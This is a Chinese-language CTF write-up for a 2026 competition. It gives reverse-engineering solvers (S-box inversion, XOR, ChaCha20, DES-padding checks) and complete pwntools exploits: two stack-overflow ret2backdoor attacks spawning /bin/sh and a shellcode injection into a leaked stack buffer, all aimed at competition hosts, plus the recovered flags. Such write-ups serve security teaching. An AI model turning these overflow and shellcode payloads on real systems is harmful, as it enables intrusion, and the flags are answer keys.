---
title: 第十届御网杯 2026
published: 2026-05-30
description: Reverse + Pwn方向个人题解
tags: [CTF, Writeup, Reverse,Pwn]
category: CTF
series: CTF Writeup
seriesOrder: 5
draft: false
---
这个比赛不予置评....

比赛办的很好，下回别办了

难度非常低，但存在阴人题目 + 很烂的服务器 + 永远连不上的靶机

# Reverse

## Rerere

sub\_140001480是核心加密函数 

```c
__int64 __fastcall sub_140001480(__int64 a1, int a2)
{
  __int64 v2; // r8

  if ( a2 <= 0 )
    return 1;
  v2 = 0;
  while ( byte_140004060[*(_BYTE *)(a1 + v2) ^ byte_140004048[v2 & 7]] == byte_140004020[v2] )
  {
    if ( ++v2 == a2 )
      return 1;
  }
  return 0;
}
```

一个s\-box反查

```python
target = bytes([
    0xA3, 0x5B, 0x4C, 0x0A, 0x0E, 0x79, 0x42, 0xC5, 0x3B, 0x12,
    0x11, 0xEB, 0xDF, 0xE5, 0x84, 0xB6, 0x61, 0xAC, 0x85, 0x83,
    0xA9, 0x3A, 0xAD, 0x2E, 0x31, 0xBE, 0x44, 0x41, 0x7C, 0x79,
    0x74, 0x93, 0x8A, 0x85, 0x06, 0xA7, 0x61, 0x6C
])

key = bytes([
    0xB9, 0xCD, 0xCE, 0x30, 0xB8, 0x61, 0x4E, 0xAA
])
sbox = bytes([
    0xC2, 0x23, 0x97, 0x49, 0x83, 0xF6, 0xD3, 0xA7, 0xEB, 0xBF,
    0x78, 0xC3, 0x29, 0x56, 0xD2, 0x1A, 0x13, 0xBC, 0x21, 0x6A,
    0x37, 0x8E, 0x5F, 0x0C, 0xB4, 0x46, 0xDE, 0xE4, 0x6C, 0xA2,
    0x66, 0x30, 0x0F, 0xA4, 0xBB, 0x8C, 0x09, 0x4B, 0x3D, 0x32,
    0x42, 0x55, 0x2D, 0x4F, 0xF9, 0x77, 0x1B, 0x74, 0x1F, 0x71,
    0x7B, 0x9D, 0x73, 0xC4, 0xAB, 0xD0, 0xF3, 0xC1, 0x88, 0x07,
    0xDC, 0xCE, 0xEF, 0xC0, 0x72, 0x4A, 0x27, 0x81, 0x9B, 0xEE,
    0xC7, 0x28, 0x26, 0x5A, 0x94, 0x54, 0x70, 0xD1, 0xE9, 0xC8,
    0x98, 0x36, 0x91, 0x41, 0xB8, 0x3A, 0x79, 0x0A, 0x08, 0xE5,
    0xAF, 0x80, 0x24, 0xAE, 0x00, 0x19, 0xCC, 0x7A, 0xF7, 0x51,
    0x7D, 0x69, 0xEC, 0x03, 0x65, 0x25, 0x1C, 0x01, 0xF5, 0xE6,
    0xBD, 0xD9, 0x59, 0xFE, 0x92, 0xB0, 0x10, 0x6F, 0xF0, 0xE3,
    0x9F, 0xAD, 0x84, 0xF4, 0xA5, 0x33, 0x35, 0x48, 0x53, 0xB1,
    0xE0, 0xD8, 0x05, 0x38, 0x18, 0x68, 0xA9, 0x14, 0xC6, 0x3F,
    0x61, 0x8A, 0x31, 0x3B, 0xBA, 0x2B, 0x4E, 0xE2, 0x57, 0x9A,
    0xF1, 0xEA, 0x64, 0x7E, 0xA0, 0x93, 0xB6, 0xDA, 0x60, 0x2E,
    0x1D, 0x5B, 0x82, 0x34, 0x6D, 0xFC, 0xCF, 0x7F, 0xE7, 0x96,
    0x67, 0x43, 0x06, 0x44, 0xC9, 0x4C, 0x40, 0xDB, 0xFD, 0x4D,
    0xB5, 0xED, 0x39, 0x2C, 0xB3, 0x17, 0x9E, 0xCD, 0xFA, 0x6B,
    0xCA, 0x87, 0x8F, 0x9C, 0x89, 0x0E, 0x63, 0x45, 0x86, 0xAA,
    0x5E, 0x95, 0x16, 0xC5, 0xD5, 0x2F, 0xA1, 0xF8, 0x99, 0xFF,
    0x3C, 0x0D, 0x3E, 0xD4, 0x04, 0x76, 0xD7, 0x47, 0x20, 0x8D,
    0xDF, 0x5C, 0x7C, 0xA3, 0x1E, 0x8B, 0x15, 0xB9, 0xA8, 0xCB,
    0x22, 0xA6, 0x52, 0xD6, 0xFB, 0x5D, 0xDD, 0xB2, 0x6E, 0xE8,
    0xF2, 0xE1, 0x2A, 0x58, 0x62, 0x12, 0x11, 0x50, 0x75, 0xB7,
    0xAC, 0x90, 0x0B, 0x85, 0x02, 0xBE
])
inv = [0] * 256
for i, v in enumerate(sbox):
    inv[v] = i

flag = bytearray()

for i, c in enumerate(target):
    flag.append(inv[c] ^ key[i & 7])

print(flag.decode())
assert bytes(sbox[flag[i] ^ key[i & 7]] for i in range(len(flag))) == target
```

运行后解出 Flag

```text
flag{7fa6888d8465734047572ccf7a140b74}
```

## 字节码迷踪


https://pylingual\.io/

反汇编得到

```python
import base64

def decrypt_flag(encoded_data, key):
    decoded = base64.b64decode(encoded_data)
    return ''.join(chr(b ^ key) for b in decoded)

def main():
    encoded_flag = 'aWNuaHRra3lgP2ZhaCJ3eTw3In19N2oiPGY9OCJ5dmdjfnxtPzdjY3ly'
    xor_key = 15

    user_input = input('请输入flag: ').strip()
    correct_flag = decrypt_flag(encoded_flag, xor_key)

    if user_input == correct_flag:
        print('正确！')
    else:
        print('错误！')
```

Exp

```c
import base64
encoded_flag = 'aWNuaHRra3lgP2ZhaCJ3eTw3In19N2oiPGY9OCJ5dmdjfnxtPzdjY3ly'
key = 15
flag = ''.join(chr(b ^ key) for b in base64.b64decode(encoded_flag))
print(flag)
```

运行后解出 Flag

```text
flag{ddvo0ing-xv38-rr8e-3i27-vyhlqsb08llv}
```

## ChaCha20

直接改后缀zip解压 so丢进IDA apk丢进JADX

密文`d097c3f6d23a8577e1`

chacha20参数也是\.rodata硬编码

```text
key   = 149263a16f2d89cbf0375b1ca94e78d3226017ee9abc4d0853e1762a8dc4903f
nonce = 44332211abcdef668899aa55
counter = 1
```

25720附近是chacha20xor主流程

```cpp
int __userpurge sub_25720@<eax>(int a1, int a2, unsigned int i_1)
{
  int v3; // eax
  char v5; // [esp+23h] [ebp-85h]
  unsigned int n64; // [esp+24h] [ebp-84h]
  int v7; // [esp+2Ch] [ebp-7Ch]
  unsigned int j; // [esp+3Ch] [ebp-6Ch]
  unsigned int i; // [esp+4Ch] [ebp-5Ch]
  int v10; // [esp+50h] [ebp-58h]
  _BYTE v11[64]; // [esp+58h] [ebp-50h] BYREF
  unsigned int v12; // [esp+98h] [ebp-10h]

  v12 = __readgsdword(0x14u);
  sub_25A70(a1, i_1);
  v10 = 1;
  for ( i = 0; i < i_1; i += n64 )
  {
    v7 = sub_27100(&unk_F2CB);
    v3 = sub_27110(&unk_F2EB);
    sub_26CA0(v7, v10++, v3, v11);
    if ( i_1 - i <= 0x40 )
      n64 = i_1 - i;
    else
      n64 = 64;
    for ( j = 0; j < n64; ++j )
    {
      v5 = v11[j] ^ *(_BYTE *)(a2 + j + i);
      *(_BYTE *)sub_27120(a1, j + i) = v5;
    }
  }
  return a1;
}
```



chacha20流密码直接反解 提取unk\_F2CB

```python
import struct

key = bytes.fromhex(
    "149263a16f2d89cbf0375b1ca94e78d3"
    "226017ee9abc4d0853e1762a8dc4903f"
)
nonce = bytes.fromhex("44332211abcdef668899aa55")
ct = bytes.fromhex("d097c3f6d23a8577e1")

def rotl32(x, n):
    return ((x << n) & 0xffffffff) | (x >> (32 - n))

def quarter_round(s, a, b, c, d):
    s[a] = (s[a] + s[b]) & 0xffffffff
    s[d] ^= s[a]
    s[d] = rotl32(s[d], 16)

    s[c] = (s[c] + s[d]) & 0xffffffff
    s[b] ^= s[c]
    s[b] = rotl32(s[b], 12)

    s[a] = (s[a] + s[b]) & 0xffffffff
    s[d] ^= s[a]
    s[d] = rotl32(s[d], 8)

    s[c] = (s[c] + s[d]) & 0xffffffff
    s[b] ^= s[c]
    s[b] = rotl32(s[b], 7)

def chacha20_block(key, counter, nonce):
    const = b"expand 32-byte k"
    state = list(struct.unpack("<4I", const))
    state += list(struct.unpack("<8I", key))
    state += [counter]
    state += list(struct.unpack("<3I", nonce))

    working = state[:]
    for _ in range(10):
        quarter_round(working, 0, 4, 8, 12)
        quarter_round(working, 1, 5, 9, 13)
        quarter_round(working, 2, 6, 10, 14)
        quarter_round(working, 3, 7, 11, 15)

        quarter_round(working, 0, 5, 10, 15)
        quarter_round(working, 1, 6, 11, 12)
        quarter_round(working, 2, 7, 8, 13)
        quarter_round(working, 3, 4, 9, 14)

    out = [(working[i] + state[i]) & 0xffffffff for i in range(16)]
    return struct.pack("<16I", *out)

ks = chacha20_block(key, 1, nonce)
flag = bytes(c ^ k for c, k in zip(ct, ks))
print(flag.decode())
```

流密码梭哈

```text
flag{qjf}
```





## CrackMe\_2


依旧改后缀解压看so层

IDA里面非常明显 flag函数verifyFlag 直接看

```cpp
int __cdecl verifyFlag(int a1, int a2, int a3)
{
  int v4; // [esp+10h] [ebp-68h]
  int i; // [esp+30h] [ebp-48h]
  unsigned __int8 v6; // [esp+37h] [ebp-41h]
  unsigned __int8 *ptr_1; // [esp+40h] [ebp-38h]
  unsigned __int8 *ptr; // [esp+44h] [ebp-34h]
  int StringUTFChars; // [esp+4Ch] [ebp-2Ch]
  unsigned __int8 v10[12]; // [esp+58h] [ebp-20h] BYREF
  size_t size; // [esp+64h] [ebp-14h] BYREF
  char v12; // [esp+6Bh] [ebp-Dh] BYREF
  unsigned int v13; // [esp+6Ch] [ebp-Ch]

  v13 = __readgsdword(0x14u);
  __android_log_print(4, "51asm", &unk_E08C);
  v12 = 0;
  StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, &v12);
  v4 = __strlen_chk(StringUTFChars, -1);
  __android_log_print(4, "51asm", &unk_E8D0);
  size = 0;
  ptr = (unsigned __int8 *)sub_24490(StringUTFChars, v4, &size);
  ptr_1 = (unsigned __int8 *)malloc(size);
  des_ecb_encrypt(ptr, size, "12345678", ptr_1);
  bytesToHex(v10, (int)ptr);
  sub_23E10(v10);
  __android_log_print(6, "51asm", &unk_D5BF);
  v6 = 0;
  for ( i = 0; i < 1; ++i )
  {
    if ( (sub_24560((char *)&unk_58060 + 12 * i, v10) & 1) != 0 )
    {
      __android_log_print(4, "51asm", &unk_CCD8);
      v6 = 1;
      break;
    }
  }
  if ( !v6 )
    __android_log_print(4, "51asm", &unk_D5E2);
  free(ptr);
  free(ptr_1);
  _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars);
  std::string::~string(v10);
  return v6;
}
```

取字符串，补齐到8字节倍数，调用了个des，但是最后比较的还是补齐后原文的hex字符串

```cpp
int sub_23E40()
{
  std::string::basic_string[abi:v170000]<decltype(nullptr)>(
    (int)&unk_58060,
    (int)"666c61677b62353237653236323131333131333465633232323531636662636137356538633966356165346634313337313837316664353"
         "5393131393237663636613162347d0202");
  return __cxa_atexit((void (*)(void *))sub_23F00, 0, &lpdso_handle_);
}
```

直接出来了

直接hex解码就行了

```text
b'flag{b527e2621131134ec22251cfbca75e8c9f5ae4f41371871fd55911927f66a1b4}\x02\x02'
```

直接出了，收

```python
flag{b527e2621131134ec22251cfbca75e8c9f5ae4f41371871fd55911927f66a1b4}
```
# PWN

## PWN\-Authenticate

保护全关

IDA里面非常明显一个backdoor

```text
int backdoor()
{
  return system("/bin/sh");
}
```

目标地址就是

```text
backdoor = 0x4011f6
```

漏洞点在login

```cpp
int login()
{
  _BYTE v1[64]; // [rsp+0h] [rbp-80h] BYREF
  char buf[64]; // [rsp+40h] [rbp-40h] BYREF

  puts("=== Welcome to SecureAuth System ===");
  printf("Username: ");
  read(0, buf, 0x40u);
  printf("Password: ");
  gets(v1);
  if ( !strcmp(buf, "admin") )
    return puts("Access Denied: Admin login is disabled.");
  else
    return puts("Invalid credentials.");
}
```

gets\(v1\)即为漏洞点，gets不限制输入长度，所以从v1开始一直向高地址覆盖

栈布局

```text
rbp-0x80  v1[64]        // password
rbp-0x40  buf[64]       // username
rbp        saved rbp
rbp+0x8    return address
```

偏移

```text
0x80 + 0x8 = 0x88 = 136
```

直接打ret2backdoor就完事了

```python
ret = 0x40101a
backdoor = 0x4011f6

payload = b"A" * 136
payload += p64(ret)
payload += p64(backdoor)
```

exp:

```python
#!/usr/bin/env python3
from pwn import *
context.arch = "amd64"
context.log_level = "debug"
HOST = "47.99.147.34"
PORT = 17564
RET = 0x40101A
BACKDOOR = 0x4011F6
OFFSET = 0x80 + 8
def start():
    if args.LOCAL:
        return process("./vuln")
    else:
        return remote(HOST, PORT)
p = start()
payload = b"A" * OFFSET
payload += p64(RET)
payload += p64(BACKDOOR)
p.sendafter(b"Username: ", b"test\n")
p.sendafter(b"Password: ", payload + b"\n")
p.interactive()
```

打穿得

```python
flag{3f48c7a7f6563f3a043f940f6809d599}
```

## PWN\-NoteService


开NX不开PIE

漏洞函数在vuln

```cpp
int vuln()
{
  _BYTE buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("=== Note Service ===");
  puts("Leave your note:");
  read(0, buf, 0x100u);
  return puts("Note saved. Thank you!");
}
```

然后依然backdoor

```python
int secret_note()
{
  return system("/bin/sh");
}
```

地址

```python
secret_note = 0x401196
```

打栈溢出

buf只有0x40但是读了0x100

栈布局

```python
rbp-0x40  buf[64]
rbp       saved rbp
rbp+0x8   return address
```

依然偏移计算

```python
0x40 + 0x8 = 0x48 = 72
```

直接ret2secret\_note\(\)梭哈

```python
from pwn import *
context.arch = "amd64"
context.log_level = "debug"
host = "120.27.146.76"
port = 19574
ret = 0x40101a
secret_note = 0x401196
payload = b"A" * 72
payload += p64(ret)
payload += p64(secret_note)
io = remote(host, port)
io.recvuntil(b"Leave your note:")
io.send(payload)
io.sendline(b"cat flag")
io.interactive()
```

得

```python
flag{b8604a81cf1196b752f8704fff71c0f2}
```

## PWN\-MessageBoard

NO PIE，NX关

栈泄露 \+ shellcode来了

```cpp
int vuln()
{
  _BYTE buf[128]; // [rsp+0h] [rbp-80h] BYREF

  puts("=== Message Board ===");
  puts("Leave your message below:");
  printf("Buffer at: %p\n", buf);
  printf("Message: ");
  read(0, buf, 0x100u);
  return puts("Thank you for your message!");
}
```

buf只有0x80但是读0x100，覆盖返回地址打印buf栈地址

buf栈地址泄露\+栈可执行\+read栈溢出

所以直接

shellcode 放到 buf 开头

padding 填到返回地址

return address 改成泄露出来的 buf 地址

```python
buf = byte ptr -80h
rbp + 8
0x80 + 0x8 = 0x88 = 136
```

所以payload

```python
shellcode
padding 到 136 字节
p64(buf_addr)
```

打ret2buf

结束

```python
#!/usr/bin/env python3
from pwn import *
context.arch = "amd64"
context.os = "linux"
context.log_level = "info"
HOST = "47.99.147.34"
PORT = 26052
OFFSET = 0x88
io = remote(HOST, PORT)
io.recvuntil(b"Buffer at: ")
buf_addr = int(io.recvline().strip(), 16)
log.success(hex(buf_addr))
io.recvuntil(b"Message: ")
payload = asm(shellcraft.sh()).ljust(OFFSET, b"\x90")
payload += p64(buf_addr)
io.send(payload)
sleep(0.2)
io.sendline(b"cat flag")
io.interactive()
```

打穿

`flag{38ad58a6ba4b17899788e836368d2ace}`

